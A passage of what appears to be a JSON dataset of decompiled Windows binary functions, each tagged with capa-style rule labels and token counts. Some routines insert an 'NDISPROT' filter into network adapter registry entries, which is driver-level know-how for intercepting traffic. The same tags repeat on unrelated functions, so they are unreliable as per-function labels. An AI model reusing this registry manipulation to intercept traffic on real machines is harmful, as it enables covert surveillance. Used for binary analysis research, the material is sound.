|| (iStack192 != 0)) || (iStack188 != 0)) || (iStack184 != 0)))) {\n                    arg1 = aiStack204;\n                }\n                uVar1 = fcn.00032e88(*arg2, arg4, in_stack_00000028);\n                if (uVar1 == 0) {\n                    fcn.0006677c(arg3, 0, 0x80);\n                    fcn.0006670a(arg3, auStack320, 0x1c);\n                    fcn.0006677c(auStack136, 0, 0x58);\n                    fcn.0006677c(in_stack_00000030, 0, in_stack_00000038);\n                    fcn.0006670a(auStack136, arg1, 0x1c);\n                    uStack108 = auStack360[0];\n                    uVar1 = (**0x7f920)(auStack136, auStack320);\n                    if (uVar1 == 0) {\n                        if (in_stack_00000038 < uStack64) {\n                            uStack64 = in_stack_00000038;\n                        }\n                        fcn.0006670a(in_stack_00000030, auStack96, uStack64);\n                        uVar1 = 0;\n                    }\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 702
    },
    "00034d08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00034d08(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint32_t *arg1_00;\n    uint32_t *puVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t *puVar9;\n    uchar auStack72 [24];\n    \n    uVar8 = 0xffffffff;\n    if (*0x7f908 != 0) {\n        if (*0x7f938 != 0) {\n            uVar2 = fcn.00034ba8(arg1);\n            return uVar2;\n        }\n        uVar2 = 0x1000;\n        fcn.00030d24(0);\n        while (arg1_00 = fcn.00030c98(uVar2),  arg1_00 != NULL) {\n            iVar1 = fcn.000668d2(*0x7f950, 0, 0, 0, auStack72, 0x120040, 0, 0, arg1_00, uVar2);\n            if (iVar1 == 0) {\n                uVar7 = 0;\n                if (*arg1_00 == 0) goto code_r0x00034e47;\n                iVar6 = 0;\n                puVar9 = arg1_00 + 2;\n                goto code_r0x00034dcf;\n            }\n            if ((iVar1 != -0x7ffffffb) && (iVar1 != -0x3fffffdd)) goto code_r0x00034e47;\n            uVar2 = uVar2 << 2;\n            fcn.00030d24(arg1_00);\n        }\n    }\n    goto code_r0x00034e4f;\n    while( true ) {\n        uVar7 = uVar7 + 1;\n        puVar9 = puVar9 + 0x41;\n        iVar6 = iVar6 + 0x82;\n        if (*arg1_00 <= uVar7) break;\ncode_r0x00034dcf:\n        uVar2 = 0;\n        iVar4 = 0;\n        puVar3 = puVar9;\n        do {\n            if (*puVar3 == 0x7b) break;\n            uVar5 = uVar2 + 1;\n            uVar2 = uVar5;\n            iVar4 = iVar4 + 1;\n            puVar3 = puVar3 + 2;\n        } while (uVar5 < 0x100);\n        if ((*(arg1_00 + (iVar4 + iVar6) * 2 + 8) == 0x7b) &&\n           (iVar1 = fcn.0006678e(arg1, arg1_00 + (uVar7 * 0x82 + uVar2) * 2 + 8, 0x100 - uVar2),  iVar1 == 0)) {\n            uVar8 = arg1_00[uVar7 * 0x41 + 1];\n            break;\n        }\n    }\ncode_r0x00034e47:\n    fcn.00030d24(arg1_00);\ncode_r0x00034e4f:\n    return uVar8;\n}\n",
        "token_count": 737
    },
    "00035138": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00035138(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    char **ppcVar5;\n    int64_t iVar6;\n    uchar auStackX8 [8];\n    uchar auStackX16 [24];\n    char acStack296 [272];\n    \n    if (*0x7fea0 == 0) {\n        fcn.000324cc(0x7f960);\n    }\n    fcn.00032650(0x7f960, auStackX16, 1);\n    ppcVar5 = 0x7fa90;\n    fcn.0006677c(0x7fa90, 0, 0x410);\n    fcn.00032684(0x7f960, auStackX16, 1);\n    iVar1 = fcn.00027418(0x2ff, acStack296, 0x104, auStackX8);\n    if (iVar1 == 0) {\n        fcn.00032650(0x7f960, auStackX16, 1);\n        iVar6 = 0;\n        pcVar3 = \"iexplore.exe\";\n        do {\n            *0x7fa83 = acStack296[iVar6];\n            \"iexplore.exe\"[iVar6] = *0x7fa83;\n            iVar6 = iVar6 + 1;\n        } while (*0x7fa83 != '\\0');\n        uVar4 = 0;\n        do {\n            if (*pcVar3 == '\\0') break;\n            *ppcVar5 = pcVar3;\n            uVar4 = uVar4 + 1;\n            ppcVar5 = ppcVar5 + 1;\n            puVar2 = fcn.0006682a(pcVar3, 0x2c);\n            if (puVar2 == NULL) break;\n            pcVar3 = puVar2 + 1;\n            *puVar2 = 0;\n        } while (uVar4 < 0x82);\n        fcn.00032684(0x7f960, auStackX16, 1);\n        *0x7fea0 = 1;\n    }\n    return;\n}\n",
        "token_count": 495
    },
    "000361e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000361e4(ulong arg1, ulong arg2, uint *arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iStackX32;\n    uint64_t *in_stack_00000028;\n    ulong uStack120;\n    uchar auStack112 [16];\n    uchar auStack96 [16];\n    uint auStack80 [2];\n    ulong uStack72;\n    uchar *puStack64;\n    uint uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    \n    uStack120 = 0;\n    iStackX32 = 0;\n    *arg4 = 0;\n    fcn.00066704(auStack112, arg1);\n    puStack64 = auStack112;\n    auStack80[0] = 0x30;\n    uStack72 = 0;\n    uStack56 = 0x140;\n    uStack48 = 0;\n    uStack40 = 0;\n    uVar2 = fcn.000666fe(&uStack120, 1, auStack80);\n    if (uVar2 == 0) {\n        fcn.00066704(auStack96, arg2);\n        uVar1 = fcn.00030728(uStack120, auStack96, 2, &iStackX32);\n        uVar2 = uVar1;\n        fcn.000666f2();\n        if (uVar1 == 0) {\n            if (((*(iStackX32 + 4) == 1) || (*(iStackX32 + 4) == 7)) || (*(iStackX32 + 4) == 2)) {\n                iVar3 = fcn.00030c98(*(iStackX32 + 8) + 2);\n                *arg4 = iVar3;\n                if (iVar3 == 0) {\n                    uVar2 = 0xc000009a;\n                }\n                else {\n                    fcn.0006677c(iVar3, 0, *(iStackX32 + 8) + 2);\n                    fcn.0006670a(*arg4, iStackX32 + 0xc, *(iStackX32 + 8));\n                    *arg3 = *(iStackX32 + 4);\n                    *in_stack_00000028 = *(iStackX32 + 8);\n                }\n            }\n            else {\n                uVar2 = 0xc0000001;\n            }\n        }\n        fcn.00030d24(iStackX32);\n    }\n    return uVar2;\n}\n",
        "token_count": 580
    },
    "000366b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.000366b0(char *arg1, uint64_t arg2, char *arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int64_t iVar5;\n    \n    if ((arg4 != 0) && (arg4 <= arg2)) {\n        if (arg2 == arg4) {\n            iVar3 = fcn.0006674c(arg1, arg3, arg2, 1, 1);\n            if (iVar3 != 0) {\n                return NULL;\n            }\n            return arg1;\n        }\n        if (arg4 == 1) {\n            pcVar4 = fcn.000668de(arg1, *arg3, arg2);\n            return pcVar4;\n        }\n        cVar1 = *arg3;\n        cVar2 = arg3[arg4 - 1];\n        for (iVar5 = (arg2 - arg4) + 1; iVar5 != 0; iVar5 = iVar5 + -1) {\n            if ((*arg1 == cVar1) && (arg1[arg4 - 1] == cVar2)) {\n                if (arg4 == 2) {\n                    return arg1;\n                }\n                iVar3 = fcn.0006674c(arg1 + 1, arg3 + 1, arg4 - 2, 1, 1);\n                if (iVar3 == 0) {\n                    return arg1;\n                }\n            }\n            arg1 = arg1 + 1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 354
    },
    "0003690c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0003690c(void)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t *arg1;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t *piStackX8;\n    uint32_t auStackX16 [2];\n    ulong auStackX24 [2];\n    \n    piStackX8 = NULL;\n    iVar3 = fcn.00036394(L\"\\\\Registry\\\\Machine\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\NetworkCards\", 0, \n                         &piStackX8);\n    arg1 = piStackX8;\n    if (iVar3 == 0) {\n        iVar4 = 0;\n        iVar2 = *piStackX8;\n        piVar1 = piStackX8;\n        while (iVar2 != 0) {\n            iVar3 = fcn.000361e4(*piVar1, 0x14430, &piStackX8, auStackX24);\n            arg1_00 = auStackX24[0];\n            if (iVar3 == 0) {\n                if (((piStackX8 == 1) && (iVar3 = fcn.0006678e(auStackX24[0], 0x14420, 7),  iVar3 != 0)) &&\n                   (iVar3 = fcn.0006678e(arg1_00, 0x14408, 8),  iVar3 != 0)) {\n                    fcn.000340ec(arg1_00, auStackX16);\n                    fcn.00030d24(arg1_00);\n                    iVar3 = fcn.000361e4(*piVar1, 0x143f0, &piStackX8, auStackX24);\n                    if (iVar3 != 0) goto code_r0x00036a14;\n                    arg1_00 = auStackX24[0];\n                    if (piStackX8 == 1) {\n                        fcn.0003314c(auStackX16[0], auStackX24[0]);\n                        arg1_00 = auStackX24[0];\n                    }\n                }\n                fcn.00030d24(arg1_00);\n            }\ncode_r0x00036a14:\n            iVar4 = iVar4 + 1;\n            piVar1 = arg1 + iVar4;\n            iVar2 = *piVar1;\n        }\n        iVar3 = 0;\n    }\n    fcn.00036358(arg1);\n    return iVar3;\n}\n",
        "token_count": 572
    },
    "00036a3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00036a3c(ulong arg1, int16_t *arg2)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    int64_t *arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t arg3;\n    uint64_t uVar5;\n    int16_t *piVar6;\n    int64_t arg1_01;\n    int64_t iVar7;\n    int32_t iVar8;\n    int64_t *piStackX24;\n    ulong uStackX32;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    iVar3 = fcn.00036394(L\"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n                         , 0x14470, &piStackX24);\n    arg1_00 = piStackX24;\n    if (iVar3 != 0) goto code_r0x00036c6d;\n    iVar7 = 0;\n    iVar8 = 0;\n    iVar4 = *piStackX24;\n    piVar1 = piStackX24;\n    while (iVar4 != 0) {\n        uStackX32 = 0;\n        iStack64 = 0;\n        iVar3 = fcn.000361e4(*piVar1, 0x14460, &piStackX24, &uStackX32);\n        if (iVar3 == 0) {\n            iVar4 = fcn.000668e4(uStackX32, arg1);\n            if ((iVar4 != 0) &&\n               (iVar3 = fcn.000361e4(*piVar1, 0x14448, &piStackX24, &iStack64),  iVar4 = iStack64,  iVar3 == 0)) {\n                uVar5 = 0xffffffffffffffff;\n                piVar6 = arg2;\n                goto code_r0x00036b56;\n            }\n            fcn.00030d24(uStackX32);\n        }\n        iVar7 = iVar7 + 1;\n        iVar8 = iVar8 + 1;\n        piVar1 = arg1_00 + iVar7;\n        iVar4 = *piVar1;\n    }\n    goto code_r0x00036c5d;\n    while( true ) {\n        uVar5 = uVar5 - 1;\n        iVar2 = *piVar6;\n        piVar6 = piVar6 + 1;\n        if (iVar2 == 0) break;\ncode_r0x00036b56:\n        if (uVar5 == 0) break;\n    }\n    iVar7 = fcn.000366b0(iStack64, iStack72, arg2, ~uVar5 - 1);\n    if (iVar7 == 0) {\n        fcn.00030d24(uStackX32);\n        fcn.00030d24(iVar4);\n        iVar3 = 0;\n    }\n    else {\n        uVar5 = 0xffffffffffffffff;\n        do {\n            if (uVar5 == 0) break;\n            uVar5 = uVar5 - 1;\n            iVar2 = *arg2;\n            arg2 = arg2 + 1;\n        } while (iVar2 != 0);\n        piStackX24 = (~uVar5 - 1) * 2 + 2 + iVar7;\n        arg1_01 = iStack72 + (~uVar5 - 1) * -2 + -2;\n        arg3 = fcn.00030c98(arg1_01);\n        if (arg3 == 0) {\n            iVar3 = -0x3fffff66;\n            fcn.00030d24(uStackX32);\n            arg3 = iVar4;\n        }\n        else {\n            fcn.0006677c(arg3, 0, arg1_01);\n            fcn.0006670a(arg3, iVar4, iVar7 - iVar4);\n            fcn.0006670a((iVar7 - iVar4) + arg3, piStackX24, iVar4 + (iStack72 - piStackX24));\n            iVar3 = fcn.00036034(arg1_00[iVar8], 0x14448, arg3, arg1_01);\n            fcn.00030d24(uStackX32);\n            fcn.00030d24(iVar4);\n        }\n        fcn.00030d24(arg3);\n    }\ncode_r0x00036c5d:\n    if (arg1_00[iVar8] == 0) {\n        iVar3 = -0x3fffffff;\n    }\ncode_r0x00036c6d:\n    fcn.00036358(arg1_00);\n    return iVar3;\n}\n",
        "token_count": 1066
    },
    "00036c88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00036c88(ulong arg1, int16_t *arg2)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    int64_t *arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int16_t *piVar7;\n    int64_t iVar8;\n    int32_t iVar9;\n    int64_t *piStackX24;\n    ulong uStackX32;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    iVar3 = fcn.00036394(L\"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n                         , 0x14470, &piStackX24);\n    arg1_00 = piStackX24;\n    if (iVar3 != 0) goto code_r0x00036e9b;\n    iVar8 = 0;\n    iVar9 = 0;\n    iVar4 = *piStackX24;\n    piVar1 = piStackX24;\n    while (iVar4 != 0) {\n        uStackX32 = 0;\n        iStack64 = 0;\n        iVar3 = fcn.000361e4(*piVar1, 0x14460, &piStackX24, &uStackX32);\n        if (iVar3 == 0) {\n            iVar4 = fcn.000668e4(uStackX32, arg1);\n            if ((iVar4 != 0) &&\n               (iVar3 = fcn.000361e4(*piVar1, 0x14448, &piStackX24, &iStack64),  iVar4 = iStack64,  iVar3 == 0)) {\n                uVar6 = 0xffffffffffffffff;\n                uVar5 = uVar6;\n                piVar7 = arg2;\n                goto code_r0x00036da8;\n            }\n            fcn.00030d24(uStackX32);\n        }\n        iVar8 = iVar8 + 1;\n        iVar9 = iVar9 + 1;\n        piVar1 = arg1_00 + iVar8;\n        iVar4 = *piVar1;\n    }\n    goto code_r0x00036e8b;\n    while( true ) {\n        uVar5 = uVar5 - 1;\n        iVar2 = *piVar7;\n        piVar7 = piVar7 + 1;\n        if (iVar2 == 0) break;\ncode_r0x00036da8:\n        if (uVar5 == 0) break;\n    }\n    iVar8 = fcn.000366b0(iStack64, iStack72, arg2, ~uVar5 * 2 + -2);\n    piVar7 = arg2;\n    if (iVar8 == 0) {\n        do {\n            if (uVar6 == 0) break;\n            uVar6 = uVar6 - 1;\n            iVar2 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar2 != 0);\n        piVar1 = iStack72 + ~uVar6 * 2;\n        piStackX24 = piVar1;\n        iVar8 = fcn.00030c98(piVar1);\n        if (iVar8 == 0) {\n            iVar3 = -0x3fffff66;\n            goto code_r0x00036dc2;\n        }\n        fcn.0006677c(iVar8, 0, piVar1);\n        fcn.0006670a(iVar8, iVar4, iStack72);\n        uVar6 = 0xffffffffffffffff;\n        piVar7 = arg2;\n        do {\n            if (uVar6 == 0) break;\n            uVar6 = uVar6 - 1;\n            iVar2 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar2 != 0);\n        fcn.0006670a(iStack72 + -2 + iVar8, arg2, (~uVar6 - 1) * 2);\n        iVar3 = fcn.00036034(arg1_00[iVar9], 0x14448, iVar8, piStackX24);\n        fcn.00030d24(uStackX32);\n        fcn.00030d24(iVar4);\n    }\n    else {\n        iVar3 = 0;\ncode_r0x00036dc2:\n        fcn.00030d24(uStackX32);\n        iVar8 = iVar4;\n    }\n    fcn.00030d24(iVar8);\ncode_r0x00036e8b:\n    if (arg1_00[iVar9] == 0) {\n        iVar3 = -0x3fffffff;\n    }\ncode_r0x00036e9b:\n    fcn.00036358(arg1_00);\n    return iVar3;\n}\n",
        "token_count": 1109
    },
    "00036fa8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00036fa8(uint *arg1)\n\n{\n    int64_t *piVar1;\n    char16_t cVar2;\n    int64_t *arg1_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint64_t arg1_01;\n    char16_t *pcVar8;\n    bool bVar9;\n    uchar auStackX8 [8];\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    int64_t *apiStack600 [2];\n    uchar auStack584 [528];\n    \n    *arg1 = 0;\n    arg1_01 = 0;\ncode_r0x00036fc5:\n    iVar3 = fcn.00032e10(arg1_01, auStack584, 0x104);\n    if (iVar3 == 0) {\n        bVar9 = false;\n        iVar3 = fcn.00036394(L\"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n                             , 0x14470, apiStack600);\n        arg1_00 = apiStack600[0];\n        if (iVar3 == 0) {\n            iVar6 = 0;\n            iVar4 = *apiStack600[0];\n            piVar1 = apiStack600[0];\n            while (iVar4 != 0) {\n                uStackX16 = 0;\n                uStackX24 = 0;\n                iVar3 = fcn.000361e4(*piVar1, 0x14460, auStackX8, &uStackX16);\n                if (iVar3 == 0) {\n                    iVar4 = fcn.000668e4(uStackX16, auStack584);\n                    if ((iVar4 != 0) && (iVar3 = fcn.000361e4(*piVar1, 0x14448, auStackX8, &uStackX24),  iVar3 == 0)) {\n                        uVar5 = 0xffffffffffffffff;\n                        pcVar8 = L\"NDISPROT\";\n                        goto code_r0x000370e0;\n                    }\n                    fcn.00030d24(uStackX16);\n                }\n                iVar6 = iVar6 + 1;\n                piVar1 = arg1_00 + iVar6;\n                iVar4 = *piVar1;\n            }\n            goto code_r0x0003711b;\n        }\n        goto code_r0x00037128;\n    }\n    goto code_r0x00037151;\n    while( true ) {\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        if (cVar2 == L'\\0') break;\ncode_r0x000370e0:\n        if (uVar5 == 0) break;\n    }\n    iVar4 = fcn.000366b0(uStackX24, uStackX32, L\"NDISPROT\", ~uVar5 * 2 + -2);\n    bVar9 = iVar4 != 0;\n    iVar3 = 0;\n    fcn.00030d24(uStackX16);\n    fcn.00030d24(uStackX24);\ncode_r0x0003711b:\n    if (arg1_00[iVar6] == 0) {\n        iVar3 = -0x3fffffff;\n    }\ncode_r0x00037128:\n    fcn.00036358(arg1_00);\n    if ((iVar3 == 0) && (!bVar9)) {\n        *arg1 = 1;\n        fcn.00036c88(auStack584, L\"NDISPROT\");\n    }\ncode_r0x00037151:\n    uVar7 = arg1_01 + 1;\n    arg1_01 = uVar7;\n    if (99 < uVar7) {\n        return;\n    }\n    goto code_r0x00036fc5;\n}\n",
        "token_count": 914
    },
    "0003814c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0003814c(ulong arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    ulong unaff_RBX;\n    int32_t iVar4;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    int64_t iVar5;\n    ulong noname_3;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    int32_t in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uint32_t uVar6;\n    uint in_stack_0000001c;\n    int64_t noname_17;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    uint uVar7;\n    uint in_stack_ffffffffffffffbc;\n    ulong in_stack_ffffffffffffffc0;\n    ulong arg1_00;\n    ulong in_stack_ffffffffffffffd0;\n    ulong in_stack_ffffffffffffffd8;\n    ulong in_stack_ffffffffffffffe0;\n    \n    arg1_00 = 0;\n    noname_17 = 0;\n    if (*0x80028 != 0) {\n        return 0;\n    }\n    *0x80030 = 0;\n    fcn.000324cc(0x80038);\n    fcn.0006677c(0x8e5e0, 0, 0x98);\n    fcn.000324cc(0x8e5e0);\n    uVar2 = fcn.0003b448(arg1, &stack0x00000020, &stack0x00000010);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    noname_3 = 0x50;\n    uVar7 = 0x20;\n    (**0x11088)(&stack0x00000018, 0x80020, 0x100);\n    if (((((in_stack_00000018 == 0) &&\n          (uVar6 = in_stack_00000018,  in_stack_00000018 = fcn.00030a40(0x14780, &stack0xffffffffffffffc8), \n          in_stack_00000018 == 0)) &&\n         (in_stack_00000018 = fcn.0004e130(arg1_00, 0x14a60, &stack0xffffffffffffffd0),  in_stack_00000018 == 0)) &&\n        ((in_stack_00000018 = fcn.0004e130(arg1_00, 0x14a48, &stack0xffffffffffffffd8),  in_stack_00000018 == 0 &&\n         (in_stack_00000018 =\n               fcn.000550f0(in_stack_ffffffffffffffd0, 0x38100, 0x80050, noname_3, \n                            CONCAT44(in_stack_ffffffffffffffbc, uVar7), in_stack_ffffffffffffffc0, arg1_00, \n                            in_stack_ffffffffffffffd0, in_stack_ffffffffffffffd8, in_stack_ffffffffffffffe0, unaff_RDI, \n                            unaff_RSI, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                            CONCAT44(in_stack_00000014, in_stack_00000010), CONCAT44(in_stack_0000001c, uVar6), \n                            noname_17, in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                            in_stack_00000048, in_stack_00000050, in_stack_00000058),  in_stack_00000018 == 0)))) &&\n       (in_stack_00000018 =\n             fcn.000550f0(in_stack_ffffffffffffffd8, 0x38060, 0x80058, noname_3, \n                          CONCAT44(in_stack_ffffffffffffffbc, uVar7), in_stack_ffffffffffffffc0, arg1_00, \n                          in_stack_ffffffffffffffd0, in_stack_ffffffffffffffd8, in_stack_ffffffffffffffe0, unaff_RDI, \n                          unaff_RSI, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                          CONCAT44(in_stack_00000014, in_stack_00000010), CONCAT44(in_stack_0000001c, uVar6), noname_17\n                          , in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                          in_stack_00000048, in_stack_00000050, in_stack_00000058),  in_stack_00000018 == 0)) {\n        *0x7fec8 = 1;\n        iVar4 = 0;\n        if (0 < in_stack_00000010) {\n            iVar5 = 0;\n            do {\n                if (noname_17 == 0) break;\n                iVar3 = *(iVar5 + noname_17);\n                do {\n                    iVar1 = *(iVar3 + 0x10);\n                    if (iVar1 == 0) {\n                        iVar3 = 0;\n                    }\n                    else {\n                        iVar3 = *(iVar1 + 0x10);\n                    }\n                } while ((iVar3 != 0) && (iVar1 != iVar3));\n                in_stack_00000018 =\n                     fcn.00037e94(*(*0x8e46c + *(iVar5 + noname_17)), *(iVar1 + 0x18), *(iVar5 + noname_17));\n                if ((in_stack_00000018 != 0) ||\n                   (in_stack_00000018 = fcn.00037da4(*(iVar5 + noname_17)),  in_stack_00000018 != 0))\n                goto code_r0x00038332;\n                iVar4 = iVar4 + 1;\n                iVar5 = iVar5 + 8;\n            } while (iVar4 < in_stack_00000010);\n        }\n        *0x80028 = 1;\n        if (in_stack_00000018 == 0) goto code_r0x00038337;\n    }\ncode_r0x00038332:\n    fcn.00037f54();\ncode_r0x00038337:\n    fcn.00030d24(noname_17);\n    return in_stack_00000018;\n}\n",
        "token_count": 1472
    },
    "00038350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00038350(ulong param_1)\n\n{\n    uchar uStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uchar uStack20;\n    uchar uStack19;\n    ushort uStack18;\n    uint uStack16;\n    uint uStack12;\n    \n    if (*0x800f0 == 0) {\n        uStack24 = 0x80;\n        uStack23 = 1;\n        uStack22 = 0x10;\n        uStack20 = 0;\n        uStack18 = 0x10;\n        uStack16 = 0x666c3650;\n        uStack19 = 1;\n        uStack12 = 0x5e8;\n        *0x800f0 = (**0x7fee0)(param_1, &uStack24);\n    }\n    return 0;\n}\n",
        "token_count": 188
    },
    "00038f60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00038f60(void)\n\n{\n    int64_t arg1;\n    int64_t *piVar1;\n    uchar auStackX8 [8];\n    ulong uStackX16;\n    \n    if (*0x800e8 != 0) {\n        *0x800e8 = 0;\n        while( true ) {\n            fcn.00032650(0x800a0, auStackX8, 0);\n            if (*0x800b8 == 0) {\n                arg1 = 0;\n            }\n            else {\n                arg1 = *(*0x800b8 + 8);\n            }\n            fcn.00032684(0x800a0, auStackX8, 0);\n            if (arg1 == 0) break;\n            fcn.00038ae4(arg1);\n        }\n        fcn.0005540c(0x800d0);\n        fcn.0005540c(0x800c8);\n        fcn.0005540c(0x800d8);\n        fcn.0005540c(0x800e0);\n        piVar1 = 0x8e558;\n        do {\n            while( true ) {\n                fcn.00032650(0x8e540, auStackX8, 0);\n                if (*piVar1 == 0) break;\n                fcn.00032684(0x8e540, auStackX8, 0);\n                uStackX16 = 0xfffffffffff85ee0;\n                (**0x115e8)(0, 0);\n            }\n            fcn.00032684(0x8e540, auStackX8, 0);\n            piVar1 = piVar1 + 1;\n        } while (piVar1 < 0x8e5d8);\n        fcn.000326c0(0x8e540);\n        fcn.000383a4();\n    }\n    return;\n}\n",
        "token_count": 431
    },
    "00039070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00039070(int64_t arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    uint64_t uVar1;\n    ulong uVar2;\n    ulong unaff_RBX;\n    int64_t *arg3;\n    ulong unaff_RBP;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    uchar *arg4;\n    int64_t *piVar3;\n    ulong unaff_R12;\n    int64_t arg2_00;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    uint32_t in_stack_00000010;\n    uint in_stack_00000014;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    \n    arg3 = NULL;\n    if (arg2 == 0) {\n        uVar1 = *0x80264;\n        arg2_00 = 0x38664;\n    }\n    else if (arg2 == 2) {\n        uVar1 = *0x8026c;\n        arg2_00 = 0x38818;\n    }\n    else if (arg2 == 3) {\n        uVar1 = *0x80244;\n        arg2_00 = 0x38d94;\n    }\n    else {\n        if 